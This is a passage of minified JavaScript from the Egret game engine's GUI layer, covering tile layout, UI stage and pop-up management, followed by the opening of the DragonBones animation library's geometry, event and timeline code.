h=this.orientation==e.TileOrientation.COLUMNS,l=!isNaN(t),p=!isNaN(i),u=isNaN(this._padding)?0:this._padding,d=isNaN(this._paddingLeft)?u:this._paddingLeft,c=isNaN(this._paddingRight)?u:this._paddingRight,_=isNaN(this._paddingTop)?u:this._paddingTop,u=isNaN(this._paddingBottom)?u:this._paddingBottom;0<this._requestedColumnCount||0<this._requestedRowCount?(0<this._requestedRowCount&&(this._rowCount=Math.min(this._requestedRowCount,s)),0<this._requestedColumnCount&&(this._columnCount=Math.min(this._requestedColumnCount,s))):l||p?!l||p&&h?(n=Math.max(0,i-_-u),this._rowCount=Math.floor((n+r)/a),this._rowCount=Math.max(1,Math.min(this._rowCount,s))):(r=Math.max(0,t-d-c),this._columnCount=Math.floor((r+n)/o),this._columnCount=Math.max(1,Math.min(this._columnCount,s))):(n=Math.sqrt(s*o*a),h?this._rowCount=Math.max(1,Math.round(n/a)):this._columnCount=Math.max(1,Math.round(n/o))),-1==this._rowCount&&(this._rowCount=Math.max(1,Math.ceil(s/this._columnCount))),-1==this._columnCount&&(this._columnCount=Math.max(1,Math.ceil(s/this._rowCount))),0<this._requestedColumnCount&&0<this._requestedRowCount&&(this.orientation==e.TileOrientation.ROWS?this._rowCount=Math.max(1,Math.ceil(s/this._requestedColumnCount)):this._columnCount=Math.max(1,Math.ceil(s/this._requestedRowCount)))}},n.prototype.updateMaxElementSize=function(){this.target&&(this.useVirtualLayout?this.updateMaxElementSizeVirtual():this.updateMaxElementSizeReal())},n.prototype.updateMaxElementSizeVirtual=function(){var t=this.typicalLayoutRect?this.typicalLayoutRect.height:22;if(this.maxElementWidth=Math.max(this.maxElementWidth,this.typicalLayoutRect?this.typicalLayoutRect.width:22),this.maxElementHeight=Math.max(this.maxElementHeight,t),-1!=this.startIndex&&-1!=this.endIndex)for(t=this.startIndex;t<=this.endIndex;t++){var e=this.target.getVirtualElementAt(t);e&&e.includeInLayout&&(this.maxElementWidth=Math.max(this.maxElementWidth,e.preferredWidth),this.maxElementHeight=Math.max(this.maxElementHeight,e.preferredHeight))}},n.prototype.updateMaxElementSizeReal=function(){for(var t=this.target.numElements,e=0;e<t;e++){var i=this.target.getElementAt(e);i&&i.includeInLayout&&(this.maxElementWidth=Math.max(this.maxElementWidth,i.preferredWidth),this.maxElementHeight=Math.max(this.maxElementHeight,i.preferredHeight))}},n.prototype.clearVirtualLayoutCache=function(){i.prototype.clearVirtualLayoutCache.call(this),this.maxElementHeight=this.maxElementWidth=0},n.prototype.scrollPositionChanged=function(){i.prototype.scrollPositionChanged.call(this),this.useVirtualLayout&&this.getIndexInView()&&(this.indexInViewCalculated=!0,this.target.invalidateDisplayList())},n.prototype.getIndexInView=function(){if(!this.target||0==this.target.numElements)return this.startIndex=this.endIndex=-1,!1;var t=this.target.numElements;if(!this.useVirtualLayout)return this.startIndex=0,this.endIndex=t-1,!1;if(isNaN(this.target.width)||0==this.target.width||isNaN(this.target.height)||0==this.target.height)return this.startIndex=this.endIndex=-1,!1;var i=this.startIndex,n=this.endIndex,r=isNaN(this._padding)?0:this._padding,s=isNaN(this._paddingLeft)?r:this._paddingLeft,r=isNaN(this._paddingTop)?r:this._paddingTop,o=isNaN(this._horizontalGap)?0:this._horizontalGap,a=isNaN(this._verticalGap)?0:this._verticalGap;if(this.orientation==e.TileOrientation.COLUMNS){if(0>=(o=this._columnWidth+o))return this.startIndex=0,this.endIndex=t-1,!1;a=this.target.horizontalScrollPosition+this.target.width,0>(r=Math.floor((this.target.horizontalScrollPosition-s)/o))&&(r=0),0>(s=Math.ceil((a-s)/o))&&(s=0),this.startIndex=Math.min(t-1,Math.max(0,r*this._rowCount)),this.endIndex=Math.min(t-1,Math.max(0,s*this._rowCount-1))}else{if(0>=(o=this._rowHeight+a))return this.startIndex=0,this.endIndex=t-1,!1;a=this.target.verticalScrollPosition+this.target.height,0>(s=Math.floor((this.target.verticalScrollPosition-r)/o))&&(s=0),0>(r=Math.ceil((a-r)/o))&&(r=0),this.startIndex=Math.min(t-1,Math.max(0,s*this._columnCount)),this.endIndex=Math.min(t-1,Math.max(0,r*this._columnCount-1))}return this.startIndex!=i||this.endIndex!=n},n.prototype.updateDisplayList=function(t,n){if(i.prototype.updateDisplayList.call(this,t,n),this.target){var r=isNaN(this._padding)?0:this._padding,s=isNaN(this._paddingLeft)?r:this._paddingLeft,o=isNaN(this._paddingRight)?r:this._paddingRight,a=isNaN(this._paddingTop)?r:this._paddingTop,h=isNaN(this._paddingBottom)?r:this._paddingBottom,r=isNaN(this._horizontalGap)?0:this._horizontalGap,l=isNaN(this._verticalGap)?0:this._verticalGap;if(this.indexInViewCalculated)this.indexInViewCalculated=!1;else{if(this.calculateRowAndColumn(t,n),0==this._rowCount||0==this._columnCount)return void this.target.setContentSize(s+o,a+h);this.adjustForJustify(t,n),this.getIndexInView()}if(this.useVirtualLayout&&(this.calculateRowAndColumn(t,n),this.adjustForJustify(t,n)),-1==this.startIndex||-1==this.endIndex)this.target.setContentSize(0,0);else{this.target.setVirtualElementIndicesInView(this.startIndex,this.endIndex);for(var p,u,d,c=this.orientation==e.TileOrientation.COLUMNS,_=this.startIndex,g=this.startIndex;g<=this.endIndex;g++)null!=(p=this.useVirtualLayout?this.target.getVirtualElementAt(g):this.target.getElementAt(g))&&p.includeInLayout&&(c?(u=Math.ceil((_+1)/this._rowCount)-1,-1==(d=Math.ceil((_+1)%this._rowCount)-1)&&(d=this._rowCount-1)):(-1==(u=Math.ceil((_+1)%this._columnCount)-1)&&(u=this._columnCount-1),d=Math.ceil((_+1)/this._columnCount)-1),u=u*(this._columnWidth+r)+s,d=d*(this._rowHeight+l)+a,this.sizeAndPositionElement(p,u,d,this._columnWidth,this.rowHeight),_++);a+=h,l=(this._rowHeight+l)*this._rowCount-l,this.target.setContentSize(Math.ceil((this._columnWidth+r)*this._columnCount-r+(s+o)),Math.ceil(l+a))}}},n.prototype.sizeAndPositionElement=function(e,i,n,r,s){var o=NaN,a=NaN;switch(this.horizontalAlign==t.HorizontalAlign.JUSTIFY?o=r:isNaN(e.percentWidth)||(o=r*e.percentWidth*.01),this.verticalAlign==t.VerticalAlign.JUSTIFY?a=s:isNaN(e.percentHeight)||(a=s*e.percentHeight*.01),e.setLayoutBoundsSize(Math.round(o),Math.round(a)),o=i,this.horizontalAlign){case t.HorizontalAlign.RIGHT:o+=r-e.layoutBoundsWidth;break;case t.HorizontalAlign.CENTER:o=i+(r-e.layoutBoundsWidth)/2}switch(i=n,this.verticalAlign){case t.VerticalAlign.BOTTOM:i+=s-e.layoutBoundsHeight;break;case t.VerticalAlign.MIDDLE:i+=(s-e.layoutBoundsHeight)/2}e.setLayoutBoundsPosition(Math.round(o),Math.round(i))},n.prototype.adjustForJustify=function(t,i){var n=isNaN(this._padding)?0:this._padding,r=isNaN(this._paddingLeft)?n:this._paddingLeft,s=isNaN(this._paddingRight)?n:this._paddingRight,o=isNaN(this._paddingTop)?n:this._paddingTop,n=isNaN(this._paddingBottom)?n:this._paddingBottom,r=Math.max(0,t-r-s),o=Math.max(0,i-o-n);isNaN(this.explicitVerticalGap)||(this._verticalGap=this.explicitVerticalGap),isNaN(this.explicitHorizontalGap)||(this._horizontalGap=this.explicitHorizontalGap),this._verticalGap=isNaN(this._verticalGap)?0:this._verticalGap,this._horizontalGap=isNaN(this._horizontalGap)?0:this._horizontalGap,o-=this._rowHeight*this._rowCount,r-=this._columnWidth*this._columnCount,0<o&&(this.rowAlign==e.RowAlign.JUSTIFY_USING_GAP?(s=Math.max(1,this._rowCount-1),this._verticalGap=o/s):this.rowAlign==e.RowAlign.JUSTIFY_USING_HEIGHT&&0<this._rowCount&&(this._rowHeight+=(o-(this._rowCount-1)*this._verticalGap)/this._rowCount)),0<r&&(this.columnAlign==e.ColumnAlign.JUSTIFY_USING_GAP?(s=Math.max(1,this._columnCount-1),this._horizontalGap=r/s):this.columnAlign==e.ColumnAlign.JUSTIFY_USING_WIDTH&&0<this._columnCount&&(this._columnWidth+=(r-(this._columnCount-1)*this._horizontalGap)/this._columnCount))},n}(e.LayoutBase);e.TileLayout=i,i.prototype.__class__="egret.gui.TileLayout"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(t,e,i){this.raw_getElementAt="raw_getElementAt",this.raw_addElementAt="raw_addElementAt",this.raw_getElementIndex="raw_getElementIndex",this.raw_removeElement="raw_removeElement",this.raw_removeElementAt="raw_removeElementAt",this.raw_setElementIndex="raw_setElementIndex",this.owner=t,this.lowerBoundReference=e,this.upperBoundReference=i}return Object.defineProperty(t.prototype,"numElements",{get:function(){return this.owner[this.upperBoundReference]-this.owner[this.lowerBoundReference]},enumerable:!0,configurable:!0}),t.prototype.getElementAt=function(t){return this.owner[this.raw_getElementAt](this.owner[this.lowerBoundReference]+t)},t.prototype.addElement=function(t){var e=this.owner[this.upperBoundReference];return t.parent===this.owner&&e--,this.owner[this.upperBoundReference]++,this.owner[this.raw_addElementAt](t,e),t.ownerChanged(this),t},t.prototype.addElementAt=function(t,e){return this.owner[this.upperBoundReference]++,this.owner[this.raw_addElementAt](t,this.owner[this.lowerBoundReference]+e),t.ownerChanged(this),t},t.prototype.removeElement=function(t){var e=this.owner[this.raw_getElementIndex](t);return this.owner[this.lowerBoundReference]<=e&&e<this.owner[this.upperBoundReference]&&(this.owner[this.raw_removeElement](t),this.owner[this.upperBoundReference]--),t.ownerChanged(null),t},t.prototype.removeElementAt=function(t){t+=this.owner[this.lowerBoundReference];var e;return this.owner[this.lowerBoundReference]<=t&&t<this.owner[this.upperBoundReference]&&(e=this.owner[this.raw_removeElementAt](t),this.owner[this.upperBoundReference]--),e.ownerChanged(null),e},t.prototype.getElementIndex=function(t){return t=this.owner[this.raw_getElementIndex](t),t-=this.owner[this.lowerBoundReference]},t.prototype.setElementIndex=function(t,e){this.owner[this.raw_setElementIndex](t,this.owner[this.lowerBoundReference]+e)},t}();t.UILayer=e,e.prototype.__class__="egret.gui.UILayer"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function n(){i.call(this),this._autoResize=!0,this._cursorIndex=this._toolTipIndex=this._topMostIndex=this._noTopMostIndex=0,this.addEventListener(t.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(t.Event.REMOVED_FROM_STAGE,this.onRemoveFromStage,this)}return __extends(n,i),n.prototype.onAddToStage=function(i){if(e.UIGlobals._uiStage)throw Error("UIStage是GUI根容器，只能有一个此实例在显示列表中！");e.UIGlobals._uiStage=this,this._autoResize&&(this.stage.addEventListener(t.Event.RESIZE,this.onResize,this),this.onResize())},n.prototype.onRemoveFromStage=function(i){e.UIGlobals._uiStage=null,this._autoResize&&this.stage.removeEventListener(t.Event.RESIZE,this.onResize,this)},n.prototype.onResize=function(t){this._setWidth(this.stage.stageWidth),this._setHeight(this.stage.stageHeight)},Object.defineProperty(n.prototype,"autoResize",{get:function(){return this._autoResize},set:function(e){this._autoResize!=e&&(this._autoResize=e,this.stage&&(this._autoResize?(this.stage.addEventListener(t.Event.RESIZE,this.onResize,this),this.onResize()):this.stage.removeEventListener(t.Event.RESIZE,this.onResize,this)))},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"x",{get:function(){return this._x},set:function(t){this._autoResize||(this._x=t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"y",{get:function(){return this._y},set:function(t){this._autoResize||(this._y=t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"width",{get:function(){return this._width},set:function(t){this._autoResize||this._setWidth(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"height",{get:function(){return this._height},set:function(t){this._autoResize||this._setHeight(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"scaleX",{get:function(){return this._scaleX},set:function(t){this._autoResize||this._setScaleX(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"scaleY",{get:function(){return this._scaleY},set:function(t){this._autoResize||this._setScaleY(t)},enumerable:!0,configurable:!0}),n.prototype.setActualSize=function(t,e){this._autoResize||i.prototype.setActualSize.call(this,t,e)},n.prototype.setLayoutBoundsPosition=function(t,e){this._autoResize||i.prototype.setLayoutBoundsPosition.call(this,t,e)},n.prototype.setLayoutBoundsSize=function(t,e){this._autoResize||i.prototype.setLayoutBoundsSize.call(this,t,e)},Object.defineProperty(n.prototype,"layout",{get:function(){return this._layout},set:function(t){t instanceof e.BasicLayout&&this._setLayout(t)},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"popUpContainer",{get:function(){return this._popUpContainer||(this._popUpContainer=new e.UILayer(this,"noTopMostIndex","topMostIndex")),this._popUpContainer},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"toolTipContainer",{get:function(){return this._toolTipContainer||(this._toolTipContainer=new e.UILayer(this,"topMostIndex","toolTipIndex")),this._toolTipContainer},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"cursorContainer",{get:function(){return this._cursorContainer||(this._cursorContainer=new e.UILayer(this,"toolTipIndex","cursorIndex")),this._cursorContainer},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"noTopMostIndex",{get:function(){return this._noTopMostIndex},set:function(t){var e=t-this._noTopMostIndex;this._noTopMostIndex=t,this.topMostIndex+=e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"topMostIndex",{get:function(){return this._topMostIndex},set:function(t){var e=t-this._topMostIndex;this._topMostIndex=t,this.toolTipIndex+=e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"toolTipIndex",{get:function(){return this._toolTipIndex},set:function(t){var e=t-this._toolTipIndex;this._toolTipIndex=t,this.cursorIndex+=e},enumerable:!0,configurable:!0}),Object.defineProperty(n.prototype,"cursorIndex",{get:function(){return this._cursorIndex},set:function(t){this._cursorIndex=t},enumerable:!0,configurable:!0}),n.prototype.addElement=function(t){var e=this._noTopMostIndex;return t.parent==this&&e--,this.addElementAt(t,e)},n.prototype.addElementAt=function(t,e){if(t.parent==this){var n=this.getElementIndex(t);n<this._noTopMostIndex?this.noTopMostIndex--:n>=this._noTopMostIndex&&n<this._topMostIndex?this.topMostIndex--:n>=this._topMostIndex&&n<this._toolTipIndex?this.toolTipIndex--:this.cursorIndex--}return e<=this._noTopMostIndex?this.noTopMostIndex++:e>this._noTopMostIndex&&e<=this._topMostIndex?this.topMostIndex++:e>this._topMostIndex&&e<=this._toolTipIndex?this.toolTipIndex++:this.cursorIndex++,i.prototype.addElementAt.call(this,t,e)},n.prototype.removeElement=function(t){return this.removeElementAt(i.prototype.getElementIndex.call(this,t))},n.prototype.removeElementAt=function(t){var e=i.prototype.removeElementAt.call(this,t);return t<this._noTopMostIndex?this.noTopMostIndex--:t>=this._noTopMostIndex&&t<this._topMostIndex?this.topMostIndex--:t>=this._topMostIndex&&t<this._toolTipIndex?this.toolTipIndex--:this.cursorIndex--,e},n.prototype.removeAllElements=function(){for(;0<this._noTopMostIndex;)i.prototype.removeElementAt.call(this,0),this.noTopMostIndex--},n.prototype._elementRemoved=function(e,n,r){void 0===r&&(r=!0),r&&t.Event.dispatchEvent(e,"removeFromUIStage"),i.prototype._elementRemoved.call(this,e,n,r)},n.prototype.raw_getElementAt=function(t){return i.prototype.getElementAt.call(this,t)},n.prototype.raw_addElement=function(t){var e=this.numElements;return t.parent==this&&e--,this.raw_addElementAt(t,e)},n.prototype.raw_addElementAt=function(t,e){if(t.parent==this){var n=this.getElementIndex(t);n<this._noTopMostIndex?this.noTopMostIndex--:n>=this._noTopMostIndex&&n<this._topMostIndex?this.topMostIndex--:n>=this._topMostIndex&&n<this._toolTipIndex?this.toolTipIndex--:this.cursorIndex--}return i.prototype.addElementAt.call(this,t,e)},n.prototype.raw_removeElement=function(t){return i.prototype.removeElementAt.call(this,i.prototype.getElementIndex.call(this,t))},n.prototype.raw_removeElementAt=function(t){return i.prototype.removeElementAt.call(this,t)},n.prototype.raw_removeAllElements=function(){for(;0<this.numElements;)i.prototype.removeElementAt.call(this,0)},n.prototype.raw_getElementIndex=function(t){return i.prototype.getElementIndex.call(this,t)},n.prototype.raw_setElementIndex=function(t,e){i.prototype.setElementIndex.call(this,t,e)},n.prototype.raw_swapElements=function(t,e){i.prototype.swapElementsAt.call(this,i.prototype.getElementIndex.call(this,t),i.prototype.getElementIndex.call(this,e))},n.prototype.raw_swapElementsAt=function(t,e){i.prototype.swapElementsAt.call(this,t,e)},n}(e.Group);e.UIStage=i,i.prototype.__class__="egret.gui.UIStage"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(i){function r(){i.call(this),this._popUpList=[],this.popUpDataList=[],this._modalColor=0,this._modalAlpha=.5,this.invalidateModalFlag=!1}return __extends(r,i),Object.defineProperty(r.prototype,"popUpList",{get:function(){return this._popUpList.concat()},enumerable:!0,configurable:!0}),r.prototype.findPopUpData=function(t){for(var e=this.popUpDataList,i=e.length,n=0;n<i;n++){var r=e[n];if(r.popUp==t)return r}return null},r.prototype.addPopUp=function(t,i,s){void 0===i&&(i=!1),void 0===s&&(s=!0);var o=e.UIGlobals.uiStage,a=this.findPopUpData(t);a?(a.modal=i,t.removeEventListener(r.REMOVE_FROM_UISTAGE,this.onRemoved,this)):(a=new n(t,i),this.popUpDataList.push(a),this._popUpList.push(t)),o.popUpContainer.addElement(t),s&&this.centerPopUp(t),"isPopUp"in t&&(t.isPopUp=!0),i&&this.invalidateModal(),t.addEventListener(r.REMOVE_FROM_UISTAGE,this.onRemoved,this)},r.prototype.onRemoved=function(t){for(var e=0,i=this.popUpDataList,n=i.length,s=0;s<n;s++){var o=i[s];if(o.popUp==t.target){"isPopUp"in o.popUp&&(o.popUp.isPopUp=!1),o.popUp.removeEventListener(r.REMOVE_FROM_UISTAGE,this.onRemoved,this),this.popUpDataList.splice(e,1),this._popUpList.splice(e,1),this.invalidateModal();break}e++}},Object.defineProperty(r.prototype,"modalColor",{get:function(){return this._modalColor},set:function(t){this._modalColor!=t&&(this._modalColor=t,this.invalidateModal())},enumerable:!0,configurable:!0}),Object.defineProperty(r.prototype,"modalAlpha",{get:function(){return this._modalAlpha},set:function(t){this._modalAlpha!=t&&(this._modalAlpha=t,this.invalidateModal())},enumerable:!0,configurable:!0}),r.prototype.invalidateModal=function(){this.invalidateModalFlag||(this.invalidateModalFlag=!0,e.UIGlobals.stage.addEventListener(t.Event.ENTER_FRAME,this.validateModal,this),e.UIGlobals.stage.addEventListener(t.Event.RENDER,this.validateModal,this),e.UIGlobals.stage.invalidate())},r.prototype.validateModal=function(i){this.invalidateModalFlag=!1,e.UIGlobals.stage.removeEventListener(t.Event.ENTER_FRAME,this.validateModal,this),e.UIGlobals.stage.removeEventListener(t.Event.RENDER,this.validateModal,this),this.updateModal(e.UIGlobals.uiStage)},r.prototype.updateModal=function(t){for(var i=t.popUpContainer,n=!1,r=i.numElements-1;0<=r;r--){var s=i.getElementAt(r);if((s=this.findPopUpData(s))&&s.modal){n=!0;break}}n?(this.modalMask||(this.modalMask=new e.Rect,this.modalMask.touchEnabled=!0,this.modalMask.top=this.modalMask.left=this.modalMask.right=this.modalMask.bottom=0),this.modalMask.fillColor=this._modalColor,this.modalMask.alpha=this._modalAlpha,this.modalMask.parent==t?(i.getElementIndex(this.modalMask)<r&&r--,i.setElementIndex(this.modalMask,r)):i.addElementAt(this.modalMask,r)):this.modalMask&&this.modalMask.parent==t&&i.removeElement(this.modalMask)},r.prototype.removePopUp=function(i){i&&i.parent&&this.findPopUpData(i)&&("removeElement"in i.parent?i.parent.removeElement(i):i.parent instanceof e.UIComponent?i.parent._removeFromDisplayList(i):i instanceof t.DisplayObject&&i.parent.removeChild(i))},r.prototype.centerPopUp=function(t){t.top=t.bottom=t.left=t.right=NaN,t.verticalCenter=t.horizontalCenter=0;var e=t.parent;e&&("validateNow"in t&&t.validateNow(),t.x=.5*(e.width-t.layoutBoundsWidth),t.y=.5*(e.height-t.layoutBoundsHeight))},r.prototype.bringToFront=function(t){if(this.findPopUpData(t)&&t.parent&&"popUpContainer"in t.parent){var e=t.parent;e.popUpContainer.setElementIndex(t,e.popUpContainer.numElements-1),this.invalidateModal()}},r.REMOVE_FROM_UISTAGE="removeFromUIStage",r}(t.EventDispatcher);e.PopUpManagerImpl=i,i.prototype.__class__="egret.gui.PopUpManagerImpl";var n=function(t,e){this.popUp=t,this.modal=e};n.prototype.__class__="PopUpData"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(e){var i=function(){function i(){}return i.getImpl=function(){if(!i._impl)try{i._impl=t.Injector.getInstance("egret.gui.IPopUpManager")}catch(t){i._impl=new e.PopUpManagerImpl}return i._impl},Object.defineProperty(i.prototype,"modalColor",{get:function(){return i.getImpl().modalColor},set:function(t){i.getImpl().modalColor=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"modalAlpha",{get:function(){return i.getImpl().modalAlpha},set:function(t){i.getImpl().modalAlpha=t},enumerable:!0,configurable:!0}),i.addPopUp=function(t,n,r){void 0===n&&(n=!1),void 0===r&&(r=!0),i.getImpl().addPopUp(t,n,r),e.PopUpEvent.dispatchPopUpEvent(i.getImpl(),e.PopUpEvent.ADD_POPUP,t,n)},i.removePopUp=function(t){i.getImpl().removePopUp(t),e.PopUpEvent.dispatchPopUpEvent(i.getImpl(),e.PopUpEvent.REMOVE_POPUP,t)},i.centerPopUp=function(t){i.getImpl().centerPopUp(t)},i.bringToFront=function(t){i.getImpl().bringToFront(t),e.PopUpEvent.dispatchPopUpEvent(i.getImpl(),e.PopUpEvent.BRING_TO_FRONT,t)},Object.defineProperty(i,"popUpList",{get:function(){return i.getImpl().popUpList},enumerable:!0,configurable:!0}),i.addEventListener=function(t,e,n,r,s){void 0===r&&(r=!1),void 0===s&&(s=0),i.getImpl().addEventListener(t,e,this,r,s)},i.removeEventListener=function(t,e,n,r){void 0===r&&(r=!1),i.getImpl().removeEventListener(t,e,n,r)},i}();e.PopUpManager=i,i.prototype.__class__="egret.gui.PopUpManager"}(t.gui||(t.gui={}))}(egret||(egret={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},dragonBones;!function(t){!function(t){var e=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=0),this.x=t,this.y=e}return t.prototype.toString=function(){return"[Point (x="+this.x+" y="+this.y+")]"},t}();t.Point=e,e.prototype.__class__="dragonBones.geom.Point",e=function(t,e,i,n){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),void 0===n&&(n=0),this.x=t,this.y=e,this.width=i,this.height=n},t.Rectangle=e,e.prototype.__class__="dragonBones.geom.Rectangle",e=function(){function t(){this.a=1,this.c=this.b=0,this.d=1,this.ty=this.tx=0}return t.prototype.invert=function(){var t=this.a,e=this.b,i=this.c,n=this.d,r=this.tx,s=t*n-e*i;this.a=n/s,this.b=-e/s,this.c=-i/s,this.d=t/s,this.tx=(i*this.ty-n*r)/s,this.ty=-(t*this.ty-e*r)/s},t}(),t.Matrix=e,e.prototype.__class__="dragonBones.geom.Matrix",e=function(){this.redOffset=this.redMultiplier=this.greenOffset=this.greenMultiplier=this.blueOffset=this.blueMultiplier=this.alphaOffset=this.alphaMultiplier=0},t.ColorTransform=e,e.prototype.__class__="dragonBones.geom.ColorTransform"}(t.geom||(t.geom={}));var e=t.geom;!function(t){var e=function(t){this.type=t};t.Event=e,e.prototype.__class__="dragonBones.events.Event";var i=function(t){function e(e){t.call(this,e)}return __extends(e,t),e.FADE_IN="fadeIn",e.FADE_OUT="fadeOut",e.START="start",e.COMPLETE="complete",e.LOOP_COMPLETE="loopComplete",e.FADE_IN_COMPLETE="fadeInComplete",e.FADE_OUT_COMPLETE="fadeOutComplete",e}(e);t.AnimationEvent=i,i.prototype.__class__="dragonBones.events.AnimationEvent",i=function(t){function e(e){t.call(this,e)}return __extends(e,t),e.Z_ORDER_UPDATED="zOrderUpdated",e}(e),t.ArmatureEvent=i,i.prototype.__class__="dragonBones.events.ArmatureEvent",i=function(t){function e(e){t.call(this,e)}return __extends(e,t),e.ANIMATION_FRAME_EVENT="animationFrameEvent",e.BONE_FRAME_EVENT="boneFrameEvent",e}(e),t.FrameEvent=i,i.prototype.__class__="dragonBones.events.FrameEvent",e=function(t){function e(e){t.call(this,e)}return __extends(e,t),e.SOUND="sound",e.BONE_FRAME_EVENT="boneFrameEvent",e}(e),t.SoundEvent=e,e.prototype.__class__="dragonBones.events.SoundEvent",e=function(){function t(){}return t.prototype.hasEventListener=function(t){return!(!this._listenersMap||!this._listenersMap[t])},t.prototype.addEventListener=function(t,e){if(t&&e){this._listenersMap||(this._listenersMap={});var i=this._listenersMap[t];i&&this.removeEventListener(t,e),i?i.push(e):this._listenersMap[t]=[e]}},t.prototype.removeEventListener=function(t,e){if(this._listenersMap&&t&&e){var i=this._listenersMap[t];if(i)for(var n=i.length,r=0;r<n;r++)i[r]==e&&(1==n?(i.length=0,delete this._listenersMap[t]):i.splice(r,1))}},t.prototype.removeAllEventListeners=function(t){t?delete this._listenersMap[t]:this._listenersMap=null},t.prototype.dispatchEvent=function(t){if(t){if(i=this._listenersMap[t.type]){t.target=this;for(var e=i.concat(),i=i.length,n=0;n<i;n++)e[n](t)}}},t}(),t.EventDispatcher=e,e.prototype.__class__="dragonBones.events.EventDispatcher",e=function(t){function e(){if(t.call(this),e._instance)throw Error("Singleton already constructed!")}return __extends(e,t),e.getInstance=function(){return e._instance||(e._instance=new e),e._instance},e}(e),t.SoundEventManager=e,e.prototype.__class__="dragonBones.events.SoundEventManager"}(t.events||(t.events={}));var i=t.events;!function(t){var n=function(){function t(){this.timeScale=1,this.time=.001*(new Date).getTime(),this._animatableList=[]}return t.prototype.contains=function(t){return 0<=this._animatableList.indexOf(t)},t.prototype.add=function(t){t&&-1==this._animatableList.indexOf(t)&&this._animatableList.push(t)},t.prototype.remove=function(t){0<=(t=this._animatableList.indexOf(t))&&(this._animatableList[t]=null)},t.prototype.clear=function(){this._animatableList.length=0},t.prototype.advanceTime=function(t){if(0>t){var e=.001*(new Date).getTime();t=e-this.time,this.time=e}if(t*=this.timeScale,0!=(e=this._animatableList.length)){for(var i=0,n=0;n<e;n++){var r=this._animatableList[n];r&&(i!=n&&(this._animatableList[i]=r,this._animatableList[n]=null),r.advanceTime(t),i++)}if(i!=n){for(e=this._animatableList.length;n<e;)this._animatableList[i++]=this._animatableList[n++];this._animatableList.length=i}}},t.clock=new t,t}();t.WorldClock=n,n.prototype.__class__="dragonBones.animation.WorldClock";var o=function(){function t(){this.transform=new r.DBTransform,this.pivot=new e.Point,this._durationTransform=new r.DBTransform,this._durationPivot=new e.Point,this._durationColor=new e.ColorTransform}return t._borrowObject=function(){return 0==t._pool.length?new t:t._pool.pop()},t._returnObject=function(e){0>t._pool.indexOf(e)&&(t._pool[t._pool.length]=e),e.clear()},t._clear=function(){for(var e=t._pool.length;e--;)t._pool[e].clear();t._pool.length=0},t.getEaseValue=function(e,i){if(1<i){var n=.5*(1-Math.cos(e*Math.PI))-e;i-=1}else 0<i?n=Math.sin(e*t.HALF_PI)-e:0>i&&(n=1-Math.cos(e*t.HALF_PI)-e,i*=-1);return n*i+e},t.prototype.fadeIn=function(t,e,i){switch(this._bone=t,this._animationState=e,this._timeline=i,this._originTransform=this._timeline.originTransform,this._originPivot=this._timeline.originPivot,this._tweenColor=this._tweenTransform=!1,this._totalTime=this._animationState.totalTime,this.transform.x=0,this.transform.y=0,this.transform.scaleX=0,this.transform.scaleY=0,this.transform.skewX=0,this.transform.skewY=0,this.pivot.x=0,this.pivot.y=0,this._durationTransform.x=0,this._durationTransform.y=0,this._durationTransform.scaleX=0,this._durationTransform.scaleY=0,this._durationTransform.skewX=0,this._durationTransform.skewY=0,this._durationPivot.x=0,this._durationPivot.y=0,this._currentFrame=null,this._timeline.getFrameList().length){case 0:this._bone._arriveAtFrame(null,this,this._animationState,!1),this._updateState=0;break;case 1:this._updateState=-1;break;default:this._updateState=1}},t.prototype.fadeOut=function(){this.transform.skewX=s.TransformUtil.formatRadian(this.transform.skewX),this.transform.skewY=s.TransformUtil.formatRadian(this.transform.skewY)},t.prototype.update=function(e){if(this._updateState)if(0<this._updateState){1==(e=0==this._timeline.scale?1:e/this._timeline.scale)&&(e=.99999999),e+=this._timeline.offset;var i=Math.floor(e);e-=i;for(var n,r=this._totalTime*e,o=!1;!this._currentFrame||r>this._currentFramePosition+this._currentFrameDuration||r<this._currentFramePosition;)o&&this._bone._arriveAtFrame(this._currentFrame,this,this._animationState,!0),o=!0,this._currentFrame?((n=this._timeline.getFrameList().indexOf(this._currentFrame)+1)>=this._timeline.getFrameList().length&&(n=0),this._currentFrame=this._timeline.getFrameList()[n]):(n=0,this._currentFrame=this._timeline.getFrameList()[0]),this._currentFrameDuration=this._currentFrame.duration,this._currentFramePosition=this._currentFrame.position;o&&(this.tweenActive=0<=this._currentFrame.displayIndex,++n>=this._timeline.getFrameList().length&&(n=0),o=this._timeline.getFrameList()[n],0==n&&this._animationState.loop&&this._animationState.loopCount>=Math.abs(this._animationState.loop)-1&&.99999999<((this._currentFramePosition+this._currentFrameDuration)/this._totalTime+i-this._timeline.offset)*this._timeline.scale?(this._updateState=0,this._tweenEasing=NaN):0>this._currentFrame.displayIndex||0>o.displayIndex||!this._animationState.tweenEnabled